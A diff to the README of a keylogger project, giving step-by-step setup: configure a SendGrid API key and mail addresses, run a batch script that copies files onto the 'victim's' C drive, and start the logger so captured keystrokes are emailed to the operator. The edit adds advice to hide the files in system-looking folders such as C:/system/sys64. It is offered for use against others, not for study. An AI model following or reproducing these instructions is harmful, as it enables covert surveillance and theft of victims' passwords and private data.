@@ -12,7 +12,7 @@ The next version of code will contain more features stay tuned.
 # 💾 guide :
 1. set-Up your sendGrid mail and just pust your key and mails in app.js.
 2. open powershell.
-3. run command "./dumpScript.bat" , with this your files are copied to C drive of victim. 
+3. run command "./dumpScript.bat" , with this your files are copied to C drive of victim. change the locations in dumpScript.bat (use destination file as C:/temp/dumpStack or C:/system/sys64)
 4. Put the sendGrid APIKEY and your emails at the placeholder in app.js.
 5. run command "app.js".
 6. congratulations !!. Your keylogger has started and now you will recieve the mails.
